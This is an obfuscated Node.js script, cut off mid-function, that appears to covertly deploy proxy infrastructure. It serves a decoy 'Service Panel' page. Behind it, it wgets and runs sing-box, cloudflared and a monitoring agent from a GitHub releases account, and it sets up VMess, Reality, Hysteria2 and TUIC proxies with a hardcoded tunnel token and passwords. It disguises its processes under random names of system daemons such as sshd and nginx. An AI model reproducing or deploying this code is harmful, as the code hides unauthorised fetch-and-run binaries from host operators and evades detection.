const b = 'const _0x88c72f=_0x3689;(function(_0x4c3876,_0x442f6b){const _0x48778e=_0x3689,_0x12bfdd=_0x4c3876();while(!![]){try{const _0x182ba7=-parseInt(_0x48778e(0x213))/0x1*(-parseInt(_0x48778e(0x1a2))/0x2)+parseInt(_0x48778e(0x222))/0x3+parseInt(_0x48778e(0x19b))/0x4+-parseInt(_0x48778e(0x1a9))/0x5+parseInt(_0x48778e(0x21d))/0x6*(parseInt(_0x48778e(0x1b6))/0x7)+parseInt(_0x48778e(0x225))/0x8*(parseInt(_0x48778e(0x1f8))/0x9)+-parseInt(_0x48778e(0x1ff))/0xa*(parseInt(_0x48778e(0x18c))/0xb);if(_0x182ba7===_0x442f6b)break;else _0x12bfdd['push'](_0x12bfdd['shift']());}catch(_0x5ba975){_0x12bfdd['push'](_0x12bfdd['shift']());}}}(_0xf317,0x8ae16));function _0xf317(){const _0x436cc9=['\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','https://komari.seav.eu.org','vless://','waifly2.seav.eu.org','containerd','php-fpm','writeHead','TUIC_UUID','</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','keys','B_D','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20refreshPage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20location.reload();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(refreshPage,\x2030000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:refreshPage()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','276619rlYBME','status-stopped','https://github.com/seav1/dl/releases/download/files/cf','http-proxy-middleware','xtls-rprx-vision','join','789456','VMess','wget\x20--timeout=120\x20--tries=3\x20--user-agent=\x22Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x22\x20-O\x20\x22','tmpdir','cloudflared','ignore','singbox','length','floor','Reality','end','httpd','0123456789abcdef','createWriteStream','\x27).then(()=>alert(\x27Copied\x20','TUIC_PORT','.log','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','syslogd','loc.gov','http2','0.0.0.0','trim','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','vmess','uptime','stopped','status','application/json','SERVER_PORT','createServer','https://github.com/seav1/dl/releases/download/files/ko','SIGINT','komari','logFile','toString','vmess://','arm64','--disable-auto-update','REALITY_PRIVATE_KEY','VMESS_PORT','supervisord','exit','atd','TUIC_PASSWORD','/health','message','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','config.json','google','HY2_PORT','--url','\x22\x20generate\x20reality-keypair','127.0.0.1','node','text/html','--no-autoupdate','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>komari</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','/status','url','9SMFklV','polkitd','REALITY_PUBLIC_KEY','python','statSync','killed','postgres','40fGDdhO','VMESS_PATH','match','443','every','K_S','--protocol','cron','express','toLowerCase','ws://localhost:','java','listen','hysteria2://','stringify','hy2-in','some','map','?encryption=none&flow=xtls-rprx-vision&security=reality&sni=','size','466664KXjoMv','vmess-in','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>','tuic','kill','!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','文件未找到:\x20','REALITY_SNI','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','http://localhost:','90RCdPfw','env','?insecure=1&sni=','1.1.1.1','push','2247231CMOKiL','direct','/vms','693696WmdSqj','tuic://','https://github.com/seav1/dl/releases/download/files/sb','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Sing-Box</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','protocol','VMESS_UUID','arch','\x22\x20check\x20-c\x20\x22','random','VMESS','running','hex','cache.db','REALITY_PORT','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Cloudflared</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','none','readFileSync','--token','dhclient','PORT','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','https://github.com/seav1/dl/releases/download/files/ko-arm','tls','dockerd','get','http','run','Wget\x20failed:\x20','\x22\x20&&\x20chmod\x20+x\x20\x22','udevd','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>','upgrade','https://github.com/seav1/dl/releases/download/files/cf-arm','www.bing.com','Hysteria2','https','--edge-ip-version','existsSync','snapd','</div></div>','cubic','auto','unlinkSync','rsyslogd','8001','komari.log','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>','home','silent','dbus-daemon','status-running','systemd','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#TUIC','setTimeout','HY2_PASSWORD','destroy','3379783oOSJRl','catch','https://ipv4.icanhazip.com','x64','sshd','HY2_SNI','amd64','mongod','10s','C_T','crypto','writeFileSync','logrotate','tunnel','stdout','1098828iiXsiy','ruby','SIGTERM','error','spawn','block','tuic-in','4HXSOTs','pipe','C_D','K_K','randomBytes','REALITY_SHORT_ID','forEach','4193565tZxbLP'];_0xf317=function(){return _0x436cc9;};return _0xf317();}function _0x3689(_0x1da0e2,_0xfff076){const _0xf317f9=_0xf317();return _0x3689=function(_0x36893c,_0x539886){_0x36893c=_0x36893c-0x15c;let _0x4e9b25=_0xf317f9[_0x36893c];return _0x4e9b25;},_0x3689(_0x1da0e2,_0xfff076);}const http=require('http'),https=require(_0x88c72f(0x176)),fs=require('fs'),path=require('path'),os=require('os'),{spawn,exec}=require('child_process'),crypto=require(_0x88c72f(0x196)),express=require(_0x88c72f(0x207)),{createProxyMiddleware}=require(_0x88c72f(0x1b9)),CONFIG={'C_T':process['env']['C_T']||'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOTg3MWZkMmItNGFhMC00ODZlLThlODItZDBmMTY4NDA3NDljIiwicyI6Ik16ZGxPVFppWm1VdE5EVTFaQzAwTlRJNExUazNZelF0WmpWalptWTBOVE0zTVdVNSJ9','B_D':process[_0x88c72f(0x21e)]['B_D']||_0x88c72f(0x1cf),'C_D':process[_0x88c72f(0x21e)]['C_D']||_0x88c72f(0x1ad),'K_S':process['env']['K_S']||_0x88c72f(0x1ab),'K_K':process[_0x88c72f(0x21e)][_0x88c72f(0x1a5)]||'g-KMWnA7fbLPeIH-','VMESS_PORT':process[_0x88c72f(0x21e)]['VMESS_PORT']||_0x88c72f(0x17f),'HY2_PORT':process[_0x88c72f(0x21e)]['HY2_PORT']||process['env'][_0x88c72f(0x1d9)]||'','REALITY_PORT':process[_0x88c72f(0x21e)]['REALITY_PORT']||'','TUIC_PORT':process[_0x88c72f(0x21e)][_0x88c72f(0x1cb)]||'','VMESS_UUID':process[_0x88c72f(0x21e)]['VMESS_UUID']||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_UUID':process[_0x88c72f(0x21e)][_0x88c72f(0x1b1)]||_0x88c72f(0x167),'TUIC_PASSWORD':process['env'][_0x88c72f(0x1e8)]||_0x88c72f(0x1bc),'HY2_PASSWORD':process[_0x88c72f(0x21e)][_0x88c72f(0x18a)]||_0x88c72f(0x1bc),'REALITY_PRIVATE_KEY':process['env'][_0x88c72f(0x1e3)]||'','REALITY_PUBLIC_KEY':process['env'][_0x88c72f(0x1fa)]||'','HY2_SNI':process[_0x88c72f(0x21e)][_0x88c72f(0x191)]||_0x88c72f(0x174),'VMESS_PATH':process[_0x88c72f(0x21e)][_0x88c72f(0x200)]||_0x88c72f(0x224),'REALITY_SNI':process[_0x88c72f(0x21e)][_0x88c72f(0x21a)]||'www.microsoft.com','REALITY_SHORT_ID':process[_0x88c72f(0x21e)][_0x88c72f(0x1a7)]||_0x88c72f(0x1c8),'PORT':process[_0x88c72f(0x21e)][_0x88c72f(0x166)]||0x1eb4},WORK_DIR=os[_0x88c72f(0x1bf)](),processes=[];let serviceStatus={'singbox':_0x88c72f(0x1d6),'cloudflared':_0x88c72f(0x1d6),'komari':_0x88c72f(0x1d6),'http':'stopped'};const HTML_TEMPLATES={'home':_0x88c72f(0x1aa),'status':(_0xf46b00,_0x5d4219)=>_0x88c72f(0x1b5)+(serviceStatus[_0x88c72f(0x1c2)]===_0x88c72f(0x15d)?'status-running':_0x88c72f(0x1b7))+_0x88c72f(0x229)+serviceStatus['singbox']+_0x88c72f(0x181)+(serviceStatus[_0x88c72f(0x1c0)]===_0x88c72f(0x15d)?_0x88c72f(0x186):_0x88c72f(0x1b7))+_0x88c72f(0x161)+serviceStatus['cloudflared']+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus['komari']===_0x88c72f(0x15d)?_0x88c72f(0x186):_0x88c72f(0x1b7))+_0x88c72f(0x1f5)+serviceStatus[_0x88c72f(0x1dd)]+_0x88c72f(0x181)+(serviceStatus['http']==='running'?_0x88c72f(0x186):'status-stopped')+'\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>HTTP\x20Server</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>'+serviceStatus[_0x88c72f(0x16c)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>'+CONFIG[_0x88c72f(0x166)]+_0x88c72f(0x1b2)+(CONFIG[_0x88c72f(0x1e4)]?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>'+CONFIG[_0x88c72f(0x1e4)]+_0x88c72f(0x17a):'')+_0x88c72f(0x1cd)+(CONFIG[_0x88c72f(0x1ee)]?_0x88c72f(0x182)+CONFIG[_0x88c72f(0x1ee)]+_0x88c72f(0x17a):'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(CONFIG[_0x88c72f(0x160)]?_0x88c72f(0x215)+CONFIG[_0x88c72f(0x160)]+_0x88c72f(0x17a):'')+_0x88c72f(0x1cd)+(CONFIG[_0x88c72f(0x1cb)]?_0x88c72f(0x228)+CONFIG['TUIC_PORT']+'</div></div>':'')+_0x88c72f(0x21b)+_0xf46b00+_0x88c72f(0x1eb)+(_0x5d4219[_0x88c72f(0x1c3)]>0x0?_0x5d4219[_0x88c72f(0x210)](_0x4c443d=>_0x88c72f(0x171)+_0x4c443d[_0x88c72f(0x22a)]+':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22'+_0x4c443d[_0x88c72f(0x22a)][_0x88c72f(0x208)]()+'\x22>'+_0x4c443d[_0x88c72f(0x1f7)]+_0x88c72f(0x1d3)+_0x4c443d[_0x88c72f(0x1f7)]+_0x88c72f(0x1ca)+_0x4c443d[_0x88c72f(0x22a)]+_0x88c72f(0x218))['join'](''):'<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20'},COMMON_PROCESS_NAMES=[_0x88c72f(0x190),'nginx','apache2',_0x88c72f(0x1c7),'mysqld',_0x88c72f(0x1fe),'redis-server','memcached','ntpd',_0x88c72f(0x187),'crond',_0x88c72f(0x17e),_0x88c72f(0x1e5),_0x88c72f(0x1f2),_0x88c72f(0x1fb),_0x88c72f(0x1af),_0x88c72f(0x20a),_0x88c72f(0x19c),_0x88c72f(0x193),_0x88c72f(0x16a),_0x88c72f(0x1ae),_0x88c72f(0x179),_0x88c72f(0x198),_0x88c72f(0x170),_0x88c72f(0x1ce),_0x88c72f(0x185),_0x88c72f(0x206),_0x88c72f(0x1e7),_0x88c72f(0x165),_0x88c72f(0x1f9),'irqbalance'];function getRandomProcessName(){const _0x1e7ac6=_0x88c72f;return COMMON_PROCESS_NAMES[Math[_0x1e7ac6(0x1c4)](Math[_0x1e7ac6(0x22e)]()*COMMON_PROCESS_NAMES[_0x1e7ac6(0x1c3)])];}function detectArch(){const _0x91ba28=_0x88c72f,_0x1eff24=process[_0x91ba28(0x22c)];return _0x1eff24===_0x91ba28(0x18f)?_0x91ba28(0x192):_0x1eff24==='arm64'?_0x91ba28(0x1e1):(process[_0x91ba28(0x1e6)](0x1),'');}async function downloadBinary(_0x1bbd6a,_0x53bf64){return new Promise((_0x482653,_0x515ab8)=>{const _0x21ecfa=_0x3689,_0x5277b2=_0x21ecfa(0x1be)+_0x53bf64+'\x22\x20\x22'+_0x1bbd6a+_0x21ecfa(0x16f)+_0x53bf64+'\x22';exec(_0x5277b2,(_0x5c853f,_0x1fcd31,_0x1543c8)=>{const _0x501f90=_0x21ecfa;if(_0x5c853f)return _0x515ab8(new Error(_0x501f90(0x16e)+_0x5c853f[_0x501f90(0x1ea)]));if(!fs[_0x501f90(0x178)](_0x53bf64))return _0x515ab8(new Error('File\x20not\x20found:\x20'+_0x53bf64));const _0x301a98=fs[_0x501f90(0x1fc)](_0x53bf64);if(_0x301a98[_0x501f90(0x212)]===0x0)return _0x515ab8(new Error('File\x20is\x20empty:\x20'+_0x53bf64));_0x482653();});});}async function getServerIP(){const _0x2833ba=_0x88c72f,_0x15fa1f=require(_0x2833ba(0x176));return new Promise(_0x8c4757=>{const _0x7530=_0x2833ba,_0x5c1fe0=_0x15fa1f[_0x7530(0x16b)](_0x7530(0x18e),_0x380950=>{const _0xd869ff=_0x7530;let _0x4b3f61='';_0x380950['on']('data',_0x23a971=>_0x4b3f61+=_0x23a971),_0x380950['on'](_0xd869ff(0x1c6),()=>_0x8c4757(_0x4b3f61[_0xd869ff(0x1d2)]()));});_0x5c1fe0['on'](_0x7530(0x19e),()=>_0x8c4757(_0x7530(0x1f1))),_0x5c1fe0[_0x7530(0x189)](0x2710,()=>{const _0x4e75cb=_0x7530;_0x5c1fe0[_0x4e75cb(0x18b)](),_0x8c4757('127.0.0.1');});});}async function startTempTunnel(_0x2ec1f5,_0x342c85){return new Promise(_0x58df5a=>{const _0x284ded=_0x3689;for(let _0xeb5f97=0x0;_0xeb5f97<0x3;_0xeb5f97++){const _0x10301c=path[_0x284ded(0x1bb)](WORK_DIR,'cf_'+crypto[_0x284ded(0x1a6)](0x4)['toString'](_0x284ded(0x15e))+_0x284ded(0x1cc)),_0x4fcb25=spawn(_0x2ec1f5,[_0x284ded(0x199),_0x284ded(0x1f4),'--url','http://localhost:'+_0x342c85],{'stdio':[_0x284ded(0x1c1),'pipe','pipe']});processes[_0x284ded(0x221)](_0x4fcb25);const _0x2b7c45=fs[_0x284ded(0x1c9)](_0x10301c);_0x4fcb25[_0x284ded(0x19a)][_0x284ded(0x1a3)](_0x2b7c45),_0x4fcb25['stderr']['pipe'](_0x2b7c45),serviceStatus['cloudflared']=_0x284ded(0x15d),_0x4fcb25['on']('error',()=>{const _0x7f1cc3=_0x284ded;serviceStatus[_0x7f1cc3(0x1c0)]='error';}),_0x4fcb25['on']('exit',_0x23076f=>{const 